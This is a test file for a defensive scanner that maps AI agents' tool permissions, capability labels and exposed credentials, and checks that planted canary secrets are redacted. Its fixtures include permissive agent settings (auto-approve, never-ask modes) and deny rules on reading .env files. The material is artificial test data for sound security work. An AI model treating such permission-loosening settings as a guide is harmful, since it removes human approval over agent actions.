        assert creds[0]["id"] == "claude-code/github#GITHUB_PAT"
        # The agent's own tools are there as a server of their own.
        assert servers(store)["builtin"]["transport"] == "builtin"
        assert tool(store, "Bash")["code_exec"] and tool(store, "Read")["private_data"]
        assert tool(store, "Read")["gate"] == "open" and tool(store, "WebFetch")["gate"] == "ask"
        # Tools the catalog names but does not label get an honest guess.
        guessed = tool(store, "mcp__github__list_discussions")
        assert guessed["label_source"] == "heuristic" and guessed["label_confidence"] <= 0.5
        assert any("49 tools run without a prompt" in w for w in result.warnings)


def test_fetch_filesystem_and_slack_from_three_scopes(dirs):
    home, project = dirs
    claude_trio(home, project)
    with Store(":memory:") as store:
        result = do_scan(store, home, project)
        found = servers(store)
        assert {n: (s["scope"], s["catalog_id"], s["catalog_match"]) for n, s in found.items() if n != "builtin"} == {
            "fetch": ("user", "fetch", "package"), "filesystem": ("project", "filesystem", "package"),
            "slack": ("local", "slack", "package")}
        assert found["filesystem"]["status"] == "approved"
        fetch = tool(store, "mcp__fetch__fetch")
        assert fetch["untrusted_input"] and fetch["external_sink"] and not fetch["private_data"]
        assert (fetch["source_scope"], fetch["sink_scope"]) == ("public", "public")
        read = tool(store, "mcp__filesystem__read_file")
        assert read["private_data"] and read["source_scope"] == "local"
        post = tool(store, "mcp__slack__slack_post_message")
        assert post["external_sink"] and post["sink_scope"] == "org"
        # The package names the archived reference server, so the other implementations' tools are left out.
        slack = tools_of(store, "claude-code/slack")
        assert "mcp__slack__slack_get_channel_history" in slack
        assert "mcp__slack__conversations_add_message" not in slack and "mcp__slack__slack_send_message" not in slack
        # The literal token is reported by name; the reference in the GitHub fixture was not.
        creds = {c["name"]: c for s in result.agents[0]["servers"] for c in s["credentials"]}
        assert creds["SLACK_BOT_TOKEN"] == {"name": "SLACK_BOT_TOKEN", "kind": "env", "literal": True, "secret": True}
        assert any("SLACK_BOT_TOKEN is written into" in w and "clear text" in w for w in result.warnings)
        assert CANARIES["env value"] not in graph_text(store) + json.dumps(result.to_dict())


@pytest.mark.parametrize("argv,url,name,expected,how", [
    (["docker", "run", "-i", "--rm", "mcp/github"], "", "x", "github", "package"),
    (["docker", "run", "-i", "--rm", "mcp/gitlab"], "", "x", "gitlab", "package"),
    (["docker", "run", "-i", "--rm", "mcp/git"], "", "x", "git", "package"),
    (["uvx", "mcp-server-git==2026.11.11", "--repository", "."], "", "x", "git", "package"),
    (["/usr/local/bin/github-mcp-server", "stdio"], "", "x", "github", "package"),
    (["python", "-m", "mcp_server_fetch"], "", "x", "fetch", "package"),
    (["npx", "-y", "mcp-remote", "https://mcp.linear.app/sse"], "", "tickets", "linear", "host"),
    ([], "https://api.githubcopilot.com/mcp/", "remote", "github", "host"),
    ([], "https://bindings.mcp.cloudflare.com/mcp", "cf", "cloudflare", "host"),
    (["docker", "mcp", "gateway", "run"], "", "MCP_DOCKER", "docker", "command"),
    (["node", "/opt/custom/index.js"], "", "sequential-thinking", "sequential-thinking", "name"),
    (["node", "/opt/custom/index.js"], "", "mystery", None, ""),
    (["node", "github-lookalike.js"], "", "notgithub", None, ""),
])
def test_servers_are_identified_by_host_package_command_or_name(argv, url, name, expected, how):
    entry = ServerEntry("claude-code", name, "project", "f", argv=argv, url=url)
    found, evidence = scan.identify_server(entry, classify.load_catalog())
    assert ((found or {}).get("id"), evidence) == (expected, how)


def test_the_guards_classifier_tells_package_names_apart_the_way_the_scan_does():
    """One package name can be the beginning of another: mcp/git, mcp/github, mcp/gitlab."""
    for image, expected in (("mcp/github", "github"), ("mcp/gitlab", "gitlab"), ("mcp/git", "git")):
        entry = classify.match_server("x", command="docker", args=["run", "-i", "--rm", image])
        assert (entry or {}).get("id") == expected, image


def test_an_unknown_server_is_kept_and_reported_without_inventing_tools(dirs):
    home, project = dirs
    write(project / ".mcp.json", {"mcpServers": {"mystery": {"command": "node", "args": ["server.js", "--port", "8080"]}}})
    with Store(":memory:") as store:
        result = do_scan(store, home, project)
        mystery = servers(store)["mystery"]
        assert (mystery["catalog_id"], mystery["tools"], mystery["enabled"]) == ("", 0, True)
        assert "not in the catalog" in mystery["notes"]
        assert tools_of(store, "claude-code/mystery") == set()
        assert any("server mystery: no tools are known" in w and "--introspect" in w for w in result.warnings)


def test_a_server_recognised_only_by_its_name_is_labelled_with_less_confidence(dirs):
    home, project = dirs
    write(project / ".mcp.json", {"mcpServers": {"postgres": {"command": "node", "args": ["my-own-db-server.js"]}}})
    with Store(":memory:") as store:
        do_scan(store, home, project)
        server = servers(store)["postgres"]
        assert (server["catalog_id"], server["catalog_match"]) == ("postgres", "name")
        assert "recognised by its name only" in server["notes"]
        query = tool(store, "mcp__postgres__query")
        assert query["label_source"] == "catalog" and query["label_confidence"] == 0.6


def test_malformed_files_are_reported_and_everything_else_is_still_scanned(dirs):
    home, project = dirs
    write(home / ".claude.json", {"mcpServers": {"fetch": {"command": "uvx", "args": ["mcp-server-fetch"]}}})
    write(project / ".mcp.json", text='{"mcpServers": {"github": {"command": "docker", ')          # cut off
    write(project / ".claude" / "settings.json", text='["not", "an", "object"]')
    write(project / ".claude" / "settings.local.json", text="\x00\x01\x02 not json at all")
    write(home / ".claude" / "settings.json", {"permissions": {"allow": "mcp__fetch", "deny": [7, None, "WebFetch"]}})
    with Store(":memory:") as store:
        result = do_scan(store, home, project)
        assert set(servers(store)) == {"builtin", "fetch"}, "the readable file still counts"
        assert len(result.problems) == 3
        assert any(".mcp.json: not valid JSON (line 1, column" in p for p in result.problems)
        assert any("settings.json: expected a JSON object" in p for p in result.problems)
        assert any("settings.local.json: not valid JSON" in p for p in result.problems)
        # A rule list of the wrong type is ignored; the usable entries of a mixed list still apply.
        assert tool(store, "mcp__fetch__fetch")["permission"] == "default"
        assert tool(store, "WebFetch")["permission"] == "deny"
        stored = store.scalar("MATCH (a:Agent {id: 'claude-code'}) RETURN a.problems")
        assert len(stored) == 3 and str(project / ".mcp.json") in "".join(stored)


@pytest.mark.parametrize("content", [
    '{"mcpServers": ["a", "b"]}',
    '{"mcpServers": {"a": "npx x", "b": null, "": {"command": "x"}, "c": {"command": 5, "args": "oops", "env": ["x"]}}}',
    '{"mcpServers": {"deep": {"command": ["node", {"x": 1}], "headers": 3, "tools": {"a": 1}, "trust": "yes"}}}',
    '{"mcpServers": ' + '[' * 3000 + ']' * 3000 + '}',
    '{"mcpServers": {"a": {"url": "http://[bad", "type": "http"}, "b": {"url": "https://x.test:notaport/", "type": "http"}}}',
    "",
])
def test_hostile_shapes_never_break_a_scan(dirs, content):
    home, project = dirs
    write(project / ".mcp.json", text=content)
    write(project / ".cursor" / "mcp.json", text=content)
    write(project / ".gemini" / "settings.json", text=content)
    write(project / ".vscode" / "mcp.json", text=content.replace("mcpServers", "servers"))
    with Store(":memory:") as store:
        result = do_scan(store, home, project)
        assert {a["kind"] for a in result.agents} >= {"claude-code", "cursor", "gemini-cli", "vscode"}
        json.dumps(result.to_dict())
        scan.render_scan(result, None)
        for canary in CANARIES.values():
            assert canary not in graph_text(store)


def test_a_broken_toml_file_is_reported(dirs):
    home, project = dirs
    write(home / ".codex" / "config.toml", text='[mcp_servers.x\ncommand = "npx"')
    with Store(":memory:") as store:
        result = do_scan(store, home, project)
        assert any("config.toml: not valid TOML" in p for p in result.problems)
        assert servers(store, "codex") == {"builtin": servers(store, "codex")["builtin"]}


def test_read_only_mode_leaves_out_tools_that_only_write(dirs):
    home, project = dirs
    write(project / ".mcp.json", {"mcpServers": {"github": {
        "command": "npx", "args": ["-y", "@modelcontextprotocol/server-github", "--read-only"]}}})
    with Store(":memory:") as store:
        do_scan(store, home, project)
        names = tools_of(store, "claude-code/github")
        assert "mcp__github__get_file_contents" in names and "mcp__github__create_issue" not in names
        server = servers(store)["github"]
        assert server["risk_reducing"] == ["--read-only"] and "tools that only write were left out" in server["notes"]
        assert store.scalar("MATCH (:Server {id: 'claude-code/github'})-[:PROVIDES]->(t:Tool {external_sink: true}) "
                            "WHERE NOT t.untrusted_input AND NOT t.private_data RETURN count(t)") == 0


def test_risk_increasing_settings_are_named(dirs):
    home, project = dirs
    write(project / ".mcp.json", {"mcpServers": {"playwright": {
        "command": "npx", "args": ["@playwright/mcp@latest", "--extension", "--isolated"]}}})
    with Store(":memory:") as store:
        result = do_scan(store, home, project)
        server = servers(store)["playwright"]
        assert server["risk_flags"] == ["--extension"] and server["risk_reducing"] == ["--isolated"]
        assert "--extension widens" in scan.render_scan(result, None)


# -- the other agents -------------------------------------------------------------------------------


def other_agents(home: Path, project: Path) -> None:
    """Configuration files of every other agent, each with a secret planted where people put them."""
    write(home / ".config" / "Claude" / "claude_desktop_config.json", {"mcpServers": {
        "filesystem": {"command": "npx", "args": ["-y", "@modelcontextprotocol/server-filesystem", "/Users/someone"]},
        "Remote Notes": {"url": "https://mcp.notion.com/mcp"},
    }})
    write(home / ".cursor" / "mcp.json", {"mcpServers": {"github": {
        "url": "https://api.githubcopilot.com/mcp/", "headers": {"Authorization": "Bearer ${env:GITHUB_TOKEN}"}}}})
    write(project / ".cursor" / "mcp.json", {"mcpServers": {"slack": {
        "command": "npx", "args": ["-y", "@modelcontextprotocol/server-slack"],
        "env": {"SLACK_BOT_TOKEN": CANARIES["env value"]}}}})
    write(project / ".cursor" / "cli.json", {"permissions": {
        "allow": ["Mcp(slack:*)", "Shell(ls)"], "deny": ["Mcp(slack:slack_post_message)", "Read(.env*)"]}})
    write(project / ".vscode" / "mcp.json", text=textwrap.dedent("""
        {
          // secrets for inputs live in VS Code's secret storage
          "inputs": [{ "type": "promptString", "id": "perplexity-key", "password": true }],
          "servers": {
            "perplexity": {
              "type": "stdio", "command": "npx", "args": ["-y", "server-perplexity-ask"],
              "env": { "PERPLEXITY_API_KEY": "${input:perplexity-key}" },
            },
            "context7": { "type": "http", "url": "https://mcp.context7.com/mcp" }, /* trailing comma next */
          },
        }
    """))
    write(project / ".vscode" / "settings.json", text='{\n  // agent mode\n  "chat.tools.global.autoApprove": true,\n}\n')
    write(home / ".codeium" / "windsurf" / "mcp_config.json", {"mcpServers": {
        "github": {"command": "npx", "args": ["-y", "@modelcontextprotocol/server-github"],
                   "env": {"GITHUB_PERSONAL_ACCESS_TOKEN": "<YOUR_PERSONAL_ACCESS_TOKEN>"}},
        "remote": {"serverUrl": f"https://mcp.internal.test/mcp?apiKey={CANARIES['url query']}",
                   "headers": {"API_KEY": f"Bearer {CANARIES['header value']}"}, "disabledTools": ["x"]},
    }})
    write(home / ".config" / "devin" / "config.json", {"permissions": {
        "allow": ["mcp__github__get_*"], "ask": ["mcp__github__create_issue"], "deny": ["mcp__github__push_files"]}})
    write(home / ".gemini" / "settings.json", {
        "mcp": {"excluded": ["experimental"]},
        "general": {"defaultApprovalMode": "default"},
        "tools": {"allowed": ["run_shell_command(git status)", "read_file"], "exclude": ["web_fetch"]},
        "mcpServers": {
            "github": {"command": "docker", "args": ["run", "-i", "--rm", "-e", f"GITHUB_PERSONAL_ACCESS_TOKEN={GH_TOKEN}",
                                                     "ghcr.io/github/github-mcp-server"], "trust": True},
            "sentry": {"httpUrl": "https://mcp.sentry.dev/mcp", "includeTools": ["whoami", "search_issues"],
                       "headers": {"Authorization": f"Bearer {CANARIES['gemini bearer']}"}},
            "experimental": {"command": "node", "args": ["exp.js"]},
        },
    })
    write(home / ".codex" / "config.toml", text=textwrap.dedent(f"""
        approval_policy = "never"
        sandbox_mode = "workspace-write"

        [mcp_servers.context7]
        command = "npx"
        args = ["-y", "@upstash/context7-mcp", "--api-key", "{CANARIES['flag value']}"]
        env_vars = ["LOCAL_TOKEN"]

        [mcp_servers.context7.env]
        MY_ENV_VAR = "MY_ENV_VALUE"

        [mcp_servers.figma]
        url = "https://mcp.figma.test/mcp"
        bearer_token_env_var = "FIGMA_OAUTH_TOKEN"
        http_headers = {{ "X-Figma-Region" = "us-east-1", "X-Api-Key" = "{CANARIES['codex header']}" }}

        [mcp_servers.gh]
        command = "npx"
        args = ["-y", "@modelcontextprotocol/server-github"]
        enabled_tools = ["get_issue", "create_issue", "get_file_contents"]
        disabled_tools = ["get_file_contents"]
        default_tools_approval_mode = "prompt"

        [mcp_servers.gh.tools.create_issue]
        approval_mode = "approve"

        [mcp_servers.off]
        command = "node"
        enabled = false
    """))


def test_every_other_agent_is_discovered_in_its_own_format(dirs):
    home, project = dirs
    other_agents(home, project)
    with Store(":memory:") as store:
        result = do_scan(store, home, project)
        kinds = [a["kind"] for a in result.agents]
        assert kinds == ["claude-desktop", "cursor", "vscode", "windsurf", "gemini-cli", "codex"]
        assert result.problems == []
        names = {r["id"]: r["name"] for r in store.run("MATCH (a:Agent) RETURN a.id AS id, a.name AS name")}
        assert names["gemini-cli"] == "Gemini CLI" and names["codex"] == "Codex CLI"

        desktop = servers(store, "claude-desktop")
        assert desktop["filesystem"]["catalog_id"] == "filesystem" and desktop["builtin"]["tools"] == 0
        assert desktop["Remote Notes"]["enabled"] is False and "stdio" in desktop["Remote Notes"]["status"]
        assert tool(store, "mcp__filesystem__read_file", "claude-desktop")["gate"] == "ask"

        cursor = servers(store, "cursor")
        assert (cursor["github"]["transport"], cursor["github"]["scope"], cursor["github"]["catalog_match"]) == \
            ("http", "user", "host")
        assert cursor["slack"]["scope"] == "project"
        assert tool(store, "mcp__slack__slack_get_users", "cursor")["permission"] == "allow"
        post = tool(store, "mcp__slack__slack_post_message", "cursor")
        assert (post["permission"], post["permission_rule"]) == ("deny", "Mcp(slack:slack_post_message)")
        assert tool(store, "mcp__github__create_issue", "cursor")["permission"] == "default"
        shell = tool(store, "Shell", "cursor")
        assert shell["code_exec"] and shell["permission_partial"] == ["allow Shell(ls)"]

        vscode = servers(store, "vscode")
        assert (vscode["perplexity"]["transport"], vscode["context7"]["transport"]) == ("stdio", "http")
        assert vscode["context7"]["url_host"] == "mcp.context7.com"
        assert store.scalar("MATCH (a:Agent {id: 'vscode'}) RETURN a.permission_mode") == "autoApprove"
        assert tool(store, "runInTerminal", "vscode")["gate"] == "open", "auto-approve runs everything unasked"

        windsurf = servers(store, "windsurf")
        assert (windsurf["remote"]["transport"], windsurf["remote"]["url_host"]) == ("http", "mcp.internal.test")
        assert windsurf["remote"]["url"] == "https://mcp.internal.test/mcp?apiKey=«redacted»"
        assert [tool(store, f"mcp__github__{n}", "windsurf")["permission"]
                for n in ("get_issue", "create_issue", "push_files", "search_code")] == ["allow", "ask", "deny", "default"]

        gemini = servers(store, "gemini-cli")
        assert (gemini["sentry"]["transport"], gemini["experimental"]["enabled"]) == ("http", False)
        assert gemini["experimental"]["status"] == "listed in mcp.excluded"
        assert tools_of(store, "gemini-cli/sentry") == {"mcp_sentry_whoami", "mcp_sentry_search_issues"}
        trusted = tool(store, "mcp_github_create_issue", "gemini-cli")
        assert (trusted["permission"], trusted["permission_rule"], trusted["gate"]) == ("allow", "trust: true", "open")
        assert tool(store, "web_fetch", "gemini-cli")["permission"] == "deny"
        assert tool(store, "read_file", "gemini-cli")["permission"] == "allow"
        run = tool(store, "run_shell_command", "gemini-cli")
        assert (run["permission"], run["permission_partial"]) == ("default", ["allow run_shell_command(git status)"])

        codex = servers(store, "codex")
        assert codex["off"]["enabled"] is False and codex["figma"]["transport"] == "http"
        assert tools_of(store, "codex/gh") == {"mcp__gh__get_issue", "mcp__gh__create_issue"}
        assert tool(store, "mcp__gh__create_issue", "codex")["permission"] == "allow"
        assert (tool(store, "mcp__gh__get_issue", "codex")["permission"],
                tool(store, "mcp__gh__get_issue", "codex")["permission_rule"]) == ("ask", "default_tools_approval_mode = prompt")
        assert store.scalar("MATCH (a:Agent {id: 'codex'}) RETURN a.permission_mode") == "never"
        assert tool(store, "shell", "codex")["gate"] == "open", "approval_policy never asks nobody"
        creds = {r["name"]: r for r in store.run(
            "MATCH (:Server {id: 'codex/figma'})-[:HOLDS]->(c:Credential) RETURN c.name AS name, c.kind AS kind, "
            "c.literal AS literal")}
        assert set(creds) == {"FIGMA_OAUTH_TOKEN", "X-Api-Key"} and creds["X-Api-Key"]["literal"] is True
        assert creds["FIGMA_OAUTH_TOKEN"]["literal"] is False


def test_a_shared_mcp_json_alone_does_not_make_vscode_appear(dirs):
    home, project = dirs
    write(project / ".mcp.json", {"mcpServers": {"fetch": {"command": "uvx", "args": ["mcp-server-fetch"]}}})
    write(project / ".vscode" / "settings.json", {"editor.tabSize": 2})
    with Store(":memory:") as store:
        assert [a["kind"] for a in do_scan(store, home, project).agents] == ["claude-code"]
    write(project / ".vscode" / "mcp.json", {"servers": {"own": {"type": "stdio", "command": "node", "args": ["x.js"]}}})
    with Store(":memory:") as store:
        result = do_scan(store, home, project)
        assert [a["kind"] for a in result.agents] == ["claude-code", "vscode"]
        assert set(servers(store, "vscode")) == {"builtin", "own", "fetch"}, "VS Code reads the shared file too"


# -- secrets never leave the configuration files ------------------------------------------------------


def secret_laden_project(home: Path, project: Path) -> None:
    other_agents(home, project)
    claude_trio(home, project, allow=[
        f'Bash(curl -H "Authorization: Bearer {CANARIES["allow rule"]}" https://api.internal.test/v1/items)',
        "mcp__slack"])
    write(project / ".mcp.json", {"mcpServers": {
        "postgres": {"command": "npx", "args": ["-y", "@modelcontextprotocol/server-postgres",
                                                f"postgresql://app:{CANARIES['url password']}@db.internal.test:5432/prod"]},
        "github": {"command": "docker", "args": [
            "run", "-i", "--rm", "-e", f"GITHUB_PERSONAL_ACCESS_TOKEN={GH_TOKEN}", "-e",
            f"EXTRA={CANARIES['docker -e assignment']}", "--api-key", CANARIES["flag value"],
            "ghcr.io/github/github-mcp-server", CANARIES["random argument"]],
            "env": {"GITHUB_TOKEN": GH_TOKEN, "AWS_ACCESS_KEY_ID": CANARIES["aws key"]}},
        "remote": {"type": "http",
                   "url": f"https://user:{CANARIES['url password']}@mcp.internal.test/t/{CANARIES['path token']}/mcp"
                          f"?apiKey={CANARIES['url query']}",
                   "headers": {"Authorization": f"Bearer {CANARIES['header value']}", "X-Trace": "on"}},
    }})


def test_no_secret_value_reaches_the_graph_the_report_or_the_terminal(dirs):
    home, project = dirs
    secret_laden_project(home, project)
    with Store(":memory:") as store:
        result = do_scan(store, home, project)
        outputs = {
            "graph": graph_text(store),
            "json report": json.dumps(result.to_dict(), ensure_ascii=False),
            "terminal": scan.render_scan(result, None),
            "tools table": scan.render_tools(scan.list_tools(store)),
        }
        for where, text in outputs.items():
            for what, canary in CANARIES.items():
                assert canary not in text, f"the {what} leaked into the {where}"
        # The names are all there, so nothing was simply dropped.
        names = {r["name"] for r in store.run("MATCH (c:Credential) RETURN c.name AS name")}
        assert {"GITHUB_PERSONAL_ACCESS_TOKEN", "GITHUB_TOKEN", "AWS_ACCESS_KEY_ID", "SLACK_BOT_TOKEN", "Authorization",
                "apiKey", "api-key", "X-Api-Key", "FIGMA_OAUTH_TOKEN", "EXTRA"} <= names
        literal = {r["name"] for r in store.run("MATCH (c:Credential {literal: true, secret: true}) RETURN c.name AS name")}
        assert {"GITHUB_TOKEN", "SLACK_BOT_TOKEN", "apiKey", "Authorization"} <= literal
        assert sum("clear text" in w for w in result.warnings) >= 6
        remote = servers(store)["remote"]
        assert remote["url"] == "https://«redacted»@mcp.internal.test/t/«redacted»/mcp?apiKey=«redacted»"
        assert servers(store)["postgres"]["command"].endswith("postgresql://«redacted»@db.internal.test:5432/prod")
        # The allow rule is still recognisable, and still opens the shell, but its token is gone.
        bash = tool(store, "Bash")
        assert bash["gate"] == "open" and bash["open_partial"] == [], "a pattern holding a secret is not kept verbatim"
        assert any(p.startswith('allow Bash(curl -H "Authorization: Bearer «redacted»"') for p in bash["permission_partial"])


def test_environment_overrides_are_only_used_when_they_are_passed_in(dirs, tmp_path, monkeypatch):
    home, project = dirs
    elsewhere = tmp_path / "elsewhere"
    write(elsewhere / ".claude.json", {"mcpServers": {"planted": {"command": "node", "args": ["planted.js"]}}})
    monkeypatch.setenv("CLAUDE_CONFIG_DIR", str(elsewhere))
    [cfg] = scan.discover(home, project, agents=["claude-code"])
    assert cfg.servers == [] and not cfg.found, "the process environment is not consulted"
    [cfg] = scan.discover(home, project, agents=["claude-code"], env={"CLAUDE_CONFIG_DIR": str(elsewhere)})
    assert [s.name for s in cfg.servers] == ["planted"]


# -- scanning again -----------------------------------------------------------------------------------


def record_call(store: Store, cfg: Config, tool_name: str, n: int = 1, session: str = "s1") -> str:
    """Put one recorded tool call in the graph, the way the guard's hook does."""
    recorder = Recorder(store, cfg)
    event = HookEvent(kind="pre_tool", session_id=session, cwd=str(cfg.root), ts=1_800_000_000_000 + n,
                      tool_name=tool_name, tool_use_id=f"t{n}", tool_input={"n": n})
    recorder.ensure_session(event)
    labels = recorder.tool_labels("claude-code", tool_name)
    return recorder.record_call(event, CallAnalysis(tool=tool_name, summary=tool_name, labels=labels), carried=[])


def test_a_rescan_replaces_the_previous_scan_and_is_repeatable(dirs):
    home, project = dirs
    claude_trio(home, project)
    with Store(":memory:") as store:
        do_scan(store, home, project)
        first = graph_text(store)
        do_scan(store, home, project)
        assert graph_text(store) == first, "the same files give the same graph, with nothing doubled"
        # slack goes away, a deny rule appears
        write(home / ".claude.json", {"mcpServers": {"fetch": {"command": "uvx", "args": ["mcp-server-fetch"]}}})
        write(project / ".claude" / "settings.json", settings(deny=["mcp__fetch"]))
        do_scan(store, home, project)
        assert set(servers(store)) == {"builtin", "fetch", "filesystem"}
        assert store.scalar("MATCH (t:Tool) WHERE t.id STARTS WITH 'claude-code::mcp__slack__' RETURN count(t)") == 0
        assert store.scalar("MATCH (c:Credential) RETURN count(c)") == 0
        assert tool(store, "mcp__fetch__fetch")["gate"] == "deny"
        tools = store.scalar("MATCH (t:Tool) RETURN count(t)")
        assert store.scalar("MATCH (:Server)-[p:PROVIDES]->(:Tool) RETURN count(p)") == tools, "one server per tool"
        assert store.scalar("MATCH (:Agent)-[c:CONNECTS]->(:Server) RETURN count(c)") == 3
        edges = store.scalar("MATCH (t:Tool)-[h:HAS_CAPABILITY]->() RETURN count(h)")
        flags = sum(bool(r["p"].get(cap)) for r in store.run("MATCH (t:Tool) RETURN properties(t) AS p")
                    for cap in ("untrusted_input", "private_data", "external_sink", "local_write", "code_exec"))
        assert edges == flags, "capability edges match the capability properties exactly"


def test_a_rescan_keeps_tools_that_sessions_reference_and_labels_set_by_hand(dirs, cfg, store):
    home, project = dirs
    claude_github(home, project)
    do_scan(store, home, project)
    call = record_call(store, cfg, "mcp__github__create_issue")
    scan.set_tool_labels(store, "mcp__github__get_me", {"external_sink": True, "sink_scope": "public"})

    (project / ".mcp.json").unlink()        # the server leaves the configuration
    do_scan(store, home, project, include_observed=False)
    assert "github" not in servers(store)
    assert store.scalar("MATCH (:ToolCall {id: $c})-[:INVOKES]->(t:Tool) RETURN t.id", {"c": call}) == \
        "claude-code::mcp__github__create_issue", "evidence of a recorded call is never deleted"
    me = tool(store, "mcp__github__get_me")
    assert me["label_source"] == "user" and me["external_sink"], "a label a person set outlives its server"
    assert store.scalar("MATCH (t:Tool) WHERE t.id STARTS WITH 'claude-code::mcp__github__' RETURN count(t)") == 2

    do_scan(store, home, project)           # with observed tools: the called tool shows up as seen-only
    assert servers(store)["github"]["scope"] == "observed"
    assert tools_of(store, "claude-code/github") == {"mcp__github__create_issue"}

    claude_github(home, project, allow=["mcp__github"])     # and the server comes back
    do_scan(store, home, project)
    me = tool(store, "mcp__github__get_me")
    assert (me["label_source"], me["external_sink"], me["sink_scope"], me["label_confidence"]) == ("user", True, "public", 1.0)
    assert me["permission"] == "allow", "everything but the labels is refreshed"
    assert store.scalar("MATCH (:Tool {id: 'claude-code::mcp__github__get_me'})-[:HAS_CAPABILITY]->"
                        "(:Capability {name: 'external_sink'}) RETURN count(*)") == 1
    assert Recorder(store, cfg).tool_labels("claude-code", "mcp__github__get_me").external_sink is True
    created = tool(store, "mcp__github__create_issue")
    assert created["observed"] is True and created["origin"] == "catalog"


def test_a_failed_scan_leaves_the_previous_one_in_place(dirs, monkeypatch):
    home, project = dirs
    claude_trio(home, project)
    with Store(":memory:") as store:
        do_scan(store, home, project)
        before = graph_text(store)
        claude_github(home, project)

        def boom(*args, **kwargs):
            raise RuntimeError("disk full")

        monkeypatch.setattr(scan, "_tool_props", boom)
        with pytest.raises(RuntimeError):
            do_scan(store, home, project)
        assert graph_text(store) == before, "one transaction: all of the new scan or none of it"
        assert store.conn.autocommit is True


def test_tools_seen_in_sessions_fill_in_what_no_file_declares(dirs, cfg, store):
    home, project = dirs                    # no configuration file anywhere
    for n, name in enumerate(["mcp__plugin_notes_vault__read_secret", "mcp__ghost__send_report",
                              "StructuredOutput", "Bash"], start=1):
        record_call(store, cfg, name, n)
    result = do_scan(store, home, project)
    assert [a["kind"] for a in result.agents] == ["claude-code"], "recorded sessions are evidence of the agent"
    ghost = servers(store)["ghost"]
    assert (ghost["scope"], ghost["transport"]) == ("observed", "unknown") and "recorded sessions" in ghost["notes"]
    send = tool(store, "mcp__ghost__send_report")
    assert send["external_sink"] and (send["origin"], send["observed"], send["label_source"]) == ("observed", True, "heuristic")
    assert "plugin_notes_vault" in servers(store)
    assert "StructuredOutput" in tools_of(store, "claude-code/builtin")
    assert tool(store, "Bash")["observed"] is True and tool(store, "Read")["observed"] is False

    result = do_scan(store, home, project, include_observed=False)
    assert result.agents == [] and servers(store) == {}
    assert store.scalar("MATCH (:ToolCall)-[:INVOKES]->(t:Tool) RETURN count(DISTINCT t)") == 4
    assert store.scalar("MATCH (:Session)-[:BY]->(a:Agent {id: 'claude-code'}) RETURN count(a)") == 1


def test_an_agent_that_is_no_longer_configured_is_removed_and_a_filtered_scan_touches_only_its_agent(dirs):
    home, project = dirs
    claude_trio(home, project)
    write(project / ".cursor" / "mcp.json", {"mcpServers": {"fetch": {"command": "uvx", "args": ["mcp-server-fetch"]}}})
    with Store(":memory:") as store:
        do_scan(store, home, project)
        assert set(servers(store, "cursor")) == {"builtin", "fetch"}
        (project / ".cursor" / "mcp.json").unlink()
        do_scan(store, home, project, agents=["claude-code"])
        assert "fetch" in servers(store, "cursor"), "a scan of one agent leaves the others alone"
        do_scan(store, home, project)
        assert store.scalar("MATCH (a:Agent {id: 'cursor'}) RETURN count(a)") == 0
        assert store.scalar("MATCH (n) WHERE n.id STARTS WITH 'cursor' RETURN count(n)") == 0
        assert set(servers(store)) == {"builtin", "fetch", "filesystem", "slack"}


def test_two_spellings_of_one_tool_prefix_do_not_collide(dirs):
    home, project = dirs
    entry = {"command": "uvx", "args": ["mcp-server-fetch"]}
    write(project / ".mcp.json", {"mcpServers": {"my.fetch": entry, "my_fetch": entry, "builtin": entry}})
    with Store(":memory:") as store:
        do_scan(store, home, project)
        ids = {r["id"] for r in store.run("MATCH (s:Server) RETURN s.id AS id")}
        assert ids == {"claude-code/builtin", "claude-code/builtin~2", "claude-code/my.fetch", "claude-code/my_fetch"}
        assert tools_of(store, "claude-code/my.fetch") == {"mcp__my_fetch__fetch"}
        assert tools_of(store, "claude-code/my_fetch") == set()
        assert "collide" in servers(store)["my_fetch"]["notes"]
        assert tools_of(store, "claude-code/builtin~2") == {"mcp__builtin__fetch"}


# -- commands -------------------------------------------------------------------------------------------


def cli(command, add_arguments, cfg: Config, *argv: str) -> int:
    """Run a command function the way ``tainttrail <command> ...`` does."""
    parser = argparse.ArgumentParser(prog="tainttrail")
    add_arguments(parser)
    return command(parser.parse_args([str(a) for a in argv]), cfg)


def scan_cli(cfg: Config, home: Path, project: Path, *extra: str) -> int:
    return cli(scan.cmd_scan, scan.add_scan_arguments, cfg, "--home", home, "--path", project, *extra)


def tools_cli(cfg: Config, *argv: str) -> int:
    return cli(scan.cmd_tools, scan.add_tools_arguments, cfg, *argv)


def test_scan_command_prints_a_readable_report_without_secrets(dirs, cfg, capsys):
    home, project = dirs
    claude_trio(home, project)
    assert scan_cli(cfg, home, project) == 0
    out = capsys.readouterr().out
    for expected in ("TaintTrail scan", "Claude Code", "filesystem", "~/.claude.json", "./.mcp.json",
                     "slack: SLACK_BOT_TOKEN (env, value written in the file)", "Toxic paths",
                     "~/.claude.json in clear text"):
        assert expected in out, expected
    assert CANARIES["env value"] not in out and "\x1b[" not in out
    assert scan_cli(cfg, home, project, "--json") == 0
    report = json.loads(capsys.readouterr().out)
    assert report["agents"][0]["kind"] == "claude-code" and report["paths"]["total"] > 0
    assert report["home"] == str(home) and report["project"] == str(project)


def test_scan_command_rejects_missing_directories_and_reports_a_busy_store(dirs, cfg, capsys):
    home, project = dirs
    assert scan_cli(cfg, home / "nope", project) == 2
    assert "is not a directory" in capsys.readouterr().err
    assert scan_cli(cfg, home, project / "nope") == 2
    capsys.readouterr()
    cfg.lock_timeout_ms = 150
    with Store(cfg.db_path):                # another process holds the graph
        assert scan_cli(cfg, home, project) == 1
    assert "tainttrail scan:" in capsys.readouterr().err


def test_scan_with_an_explicit_home_ignores_the_real_environment(dirs, cfg, tmp_path, monkeypatch, capsys):
    home, project = dirs
    planted = tmp_path / "planted"
    write(planted / ".claude.json", {"mcpServers": {"planted": {"command": "node", "args": ["x.js"]}}})
    write(planted / "settings.json", settings(mode="bypassPermissions"))
    monkeypatch.setenv("CLAUDE_CONFIG_DIR", str(planted))
    monkeypatch.setenv("XDG_CONFIG_HOME", str(planted))
    monkeypatch.setenv("CODEX_HOME", str(planted))
    assert scan_cli(cfg, home, project, "--json") == 0
    assert json.loads(capsys.readouterr().out)["agents"] == []


def test_tools_command_lists_sets_and_resets_labels(dirs, cfg, capsys):
    home, project = dirs
    claude_github(home, project)
    assert tools_cli(cfg) == 0
    assert "No tools in the graph yet" in capsys.readouterr().out
    assert not cfg.db_path.exists(), "listing does not create a graph"
    scan_cli(cfg, home, project, "--json")
    capsys.readouterr()

    assert tools_cli(cfg, "set", "mcp__github__get_me", "external_sink=true", "sink_scope=public") == 0
